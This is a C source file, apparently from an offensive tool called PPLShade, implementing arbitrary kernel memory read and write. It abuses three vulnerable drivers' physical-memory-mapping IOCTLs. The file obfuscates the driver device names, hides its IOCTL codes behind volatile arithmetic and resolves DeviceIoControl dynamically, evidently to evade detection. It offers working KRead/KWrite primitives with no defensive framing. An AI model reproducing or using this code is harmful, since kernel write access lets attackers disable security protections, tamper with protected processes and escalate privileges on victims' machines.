/*
 *  PPLShade - memory.c
 *  Unified kernel memory access — 3 MmMapIoSpace-based driver backends.
 *  Driver is selected at runtime via MemoryAutoDetect().
 */

#include "memory.h"
#include "memory_translation.h"
#include "strob.h"

// ====================== Active Driver State ======================
static DRIVER_ID g_ActiveDriver = DRV_INVALID;

// ====================== DeviceIoControl Thunk ======================
typedef BOOL (WINAPI *fn_DvIO)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
static fn_DvIO _pDvIO = NULL;

static BOOL _callDev(HANDLE hDev, DWORD ioctl, LPVOID in, DWORD inSz, LPVOID out, DWORD outSz, LPDWORD pRet) {
    if (!_pDvIO) {
        HMODULE hK = GetModuleHandleA("kernel32.dll");
        if (hK) _pDvIO = (fn_DvIO)GetProcAddress(hK, "DeviceIoControl");
        if (!_pDvIO) return FALSE;
    }
    return _pDvIO(hDev, ioctl, in, inSz, out, outSz, pRet, NULL);
}

// ====================== Driver Name Table ======================
static const char* g_DriverNames[] = { "lecoma64", "ipctype", "mtxvxd" };

const char* MemoryDriverName(DRIVER_ID id) {
    if (id >= 0 && id < DRV_COUNT) return g_DriverNames[id];
    return "unknown";
}

DRIVER_ID MemoryParseDriver(const char* name) {
    if (!name) return DRV_INVALID;
    for (int i = 0; i < DRV_COUNT; i++) {
        if (!_stricmp(name, g_DriverNames[i])) return (DRIVER_ID)i;
    }
    return DRV_INVALID;
}

BOOL MemoryInit(DRIVER_ID drvId) {
    if (drvId < 0 || drvId >= DRV_COUNT) return FALSE;
    g_ActiveDriver = drvId;
    return TRUE;
}

DRIVER_ID MemoryGetDriver(void) { return g_ActiveDriver; }

// ====================== Device Open ======================
HANDLE MemoryOpenDevice(void) {
    WCHAR sym[64] = { 0 };
    sym[0] = L'\\'; sym[1] = L'\\'; sym[2] = L'.'; sym[3] = L'\\';

    switch (g_ActiveDriver) {
        case DRV_LECOMA64: DEC_DRV_LECOMA64(sym + 4); break;
        case DRV_IPCTYPE:  DEC_DRV_IPCTYPE(sym + 4);  break;
        case DRV_MTXVXD:   DEC_DRV_MTXVXD(sym + 4);   break;
        default: return INVALID_HANDLE_VALUE;
    }

    HANDLE h = CreateFileW(sym, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SecureZeroMemory(sym, sizeof(sym));
    return h;
}

// ====================== Auto-Detect ======================
HANDLE MemoryAutoDetect(void) {
    for (int i = 0; i < DRV_COUNT; i++) {
        g_ActiveDriver = (DRIVER_ID)i;
        HANDLE h = MemoryOpenDevice();
        if (h != INVALID_HANDLE_VALUE)
            return h;
    }
    g_ActiveDriver = DRV_INVALID;
    return INVALID_HANDLE_VALUE;
}

/* ===================================================================
 *  IOCTL constants per driver
 * =================================================================== */

static __forceinline DWORD _lecoma64_ioMap(void) { volatile DWORD a = 0x80000000; volatile DWORD b = 0x2003; return a | b; }

static __forceinline DWORD _ipctype_ioMap(void)   { volatile DWORD a = 0x80100000; volatile DWORD b = 0x2040; return a | b; }
static __forceinline DWORD _ipctype_ioUnmap(void) { volatile DWORD a = 0x80100000; volatile DWORD b = 0x2044; return a | b; }

static __forceinline DWORD _mtxvxd_ioMap(void)    { volatile DWORD a = 0x9C400000; volatile DWORD b = 0x644C; return a | b; }
static __forceinline DWORD _mtxvxd_ioUnmap(void)  { volatile DWORD a = 0x9C400000; volatile DWORD b = 0x6450; return a | b; }

/* ===================================================================
 *  LECOMA64 — MmMapIoSpace + MDL, METHOD_NEITHER
 *  Map IOCTL 0x80002003, no explicit unmap (freed on handle close)
 * =================================================================== */

#pragma pack(push, 1)
typedef struct {
    DWORD64 PhysAddr;
    DWORD   Mode2;
    DWORD   Mode1;
    DWORD   Size;
    DWORD   Type;
    DWORD   Flags;
    DWORD   Quota;
} LECOMA_REQ;
#pragma pack(pop)

static DWORD64 _lecoma64_MapPhys(HANDLE hDev, DWORD64 phys, DWORD size) {
    LECOMA_REQ req = { 0 };
    req.PhysAddr = phys;
    req.Mode1    = 2;
    req.Size     = size;
    req.Type     = 2;
    req.Flags    = 0;
    req.Quota    = 2;
    DWORD64 va = 0;
    DWORD br = 0;
    if (!_callDev(hDev, _lecoma64_ioMap(), &req, sizeof(req), &va, 8, &br))
        return 0;
    return va;
}

static void _lecoma64_UnmapPhys(HANDLE hDev, DWORD64 va) {
    (void)hDev; (void)va;
    // No explicit unmap — all mappings freed on handle close
}

/* ===================================================================
 *  IPCTYPE — packed 28-byte struct
 * =================================================================== */

#pragma pack(push, 1)
typedef struct {
    DWORD   Pad0;
    DWORD   Pad1;
    DWORD   Size;
    DWORD64 PhysAddr;
    DWORD64 MappedVA;
} IPC_REQ;
#pragma pack(pop)

static DWORD64 _ipctype_MapPhys(HANDLE hDev, DWORD64 phys, DWORD size) {
    IPC_REQ req = { 0 };
    req.Size     = size;
    req.PhysAddr = phys;
    DWORD br = 0;
    if (!_callDev(hDev, _ipctype_ioMap(), &req, 28, &req, 28, &br))
        return 0;
    return req.MappedVA;
}

static void _ipctype_UnmapPhys(HANDLE hDev, DWORD64 va) {
    IPC_REQ req = { 0 };
    req.MappedVA = va;
    DWORD br = 0;
    _callDev(hDev, _ipctype_ioUnmap(), &req, 28, NULL, 0, &br);
}

/* ===================================================================
 *  MTXVXD — [PhysAddr8][Size4][AccessMode4] in, VA8 out
 * =================================================================== */

typedef struct {
    DWORD64 PhysAddr;
    DWORD   Size;
    DWORD   AccessMode;
} MTX_MAP_IN;

static DWORD64 _mtxvxd_MapPhys(HANDLE hDev, DWORD64 phys, DWORD size) {
    MTX_MAP_IN req = { 0 };
    req.PhysAddr   = phys;
    req.Size       = size;
    req.AccessMode = 0;
    DWORD64 va = 0;
    DWORD br = 0;
    if (!_callDev(hDev, _mtxvxd_ioMap(), &req, sizeof(req), &va, sizeof(va), &br))
        return 0;
    return va;
}

static void _mtxvxd_UnmapPhys(HANDLE hDev, DWORD64 va) {
    DWORD64 addr = va;
    DWORD br = 0;
    _callDev(hDev, _mtxvxd_ioUnmap(), &addr, sizeof(addr), NULL, 0, &br);
}

/* ===================================================================
 *  Unified Map/Unmap dispatch
 * =================================================================== */

static DWORD64 MapPhys(HANDLE hDev, DWORD64 phys, DWORD size) {
    switch (g_ActiveDriver) {
        case DRV_LECOMA64: return _lecoma64_MapPhys(hDev, phys, size);
        case DRV_IPCTYPE:  return _ipctype_MapPhys(hDev, phys, size);
        case DRV_MTXVXD:   return _mtxvxd_MapPhys(hDev, phys, size);
        default: return 0;
    }
}

static void UnmapPhys(HANDLE hDev, DWORD64 va) {
    switch (g_ActiveDriver) {
        case DRV_LECOMA64: _lecoma64_UnmapPhys(hDev, va); break;
        case DRV_IPCTYPE:  _ipctype_UnmapPhys(hDev, va);  break;
        case DRV_MTXVXD:   _mtxvxd_UnmapPhys(hDev, va);   break;
    }
}

/* ===================================================================
 *  Shared ReadPrim / WritePrim
 * =================================================================== */

static DWORD ReadPrim(IN HANDLE hDev, IN DWORD sz, IN DWORD64 addr) {
    DWORD64 pa = VirtualToPhysical(addr);
    if (!pa) return 0;
    DWORD64 mapped = MapPhys(hDev, pa, sz);
    if (!mapped) return 0;
    DWORD val = 0;
    switch (sz) {
        case 1: val = *(volatile BYTE*)(ULONG_PTR)mapped; break;
        case 2: val = *(volatile WORD*)(ULONG_PTR)mapped; break;
        case 4: val = *(volatile DWORD*)(ULONG_PTR)mapped; break;
    }
    UnmapPhys(hDev, mapped);
    return val;
}

static BOOL WritePrim(IN HANDLE hDev, IN DWORD sz, IN DWORD64 addr, IN DWORD val) {
    DWORD64 pa = VirtualToPhysical(addr);
    if (!pa) return FALSE;
    DWORD64 mapped = MapPhys(hDev, pa, sz);
    if (!mapped) return FALSE;
    switch (sz) {
        case 1: *(volatile BYTE*)(ULONG_PTR)mapped  = (BYTE)val; break;
        case 2: *(volatile WORD*)(ULONG_PTR)mapped  = (WORD)val; break;
        case 4: *(volatile DWORD*)(ULONG_PTR)mapped = val; break;
    }
    UnmapPhys(hDev, mapped);
    return TRUE;
}

/* ===================================================================
 *  Public KRead / KWrite API
 * =================================================================== */

BYTE KRead8(IN HANDLE h, IN DWORD64 a)  { return (BYTE)(ReadPrim(h, 1, a) & 0xFF); }
WORD KRead16(IN HANDLE h, IN DWORD64 a) { return (WORD)(ReadPrim(h, 2, a) & 0xFFFF); }
DWORD KRead32(IN HANDLE h, IN DWORD64 a) { return ReadPrim(h, 4, a); }
DWORD64 KRead64(IN HANDLE h, IN DWORD64 a) {
    DWORD lo = KRead32(h, a);
    DWORD hi = KRead32(h, a + 4);
    return ((DWORD64)hi << 32) | lo;
}

BOOL KWrite8(IN HANDLE h, IN DWORD64 a, IN BYTE v)  { return WritePrim(h, 1, a, (DWORD)v); }
BOOL KWrite16(IN HANDLE h, IN DWORD64 a, IN WORD v) { return WritePrim(h, 2, a, (DWORD)v); }
BOOL KWrite32(IN HANDLE h, IN DWORD64 a, IN DWORD v) { return WritePrim(h, 4, a, v); }
BOOL KWrite64(IN HANDLE h, IN DWORD64 a, IN DWORD64 v) {
    BOOL r1 = KWrite32(h, a,     (DWORD)(v & 0xFFFFFFFF));
    BOOL r2 = KWrite32(h, a + 4, (DWORD)(v >> 32));
    return r1 && r2;
}
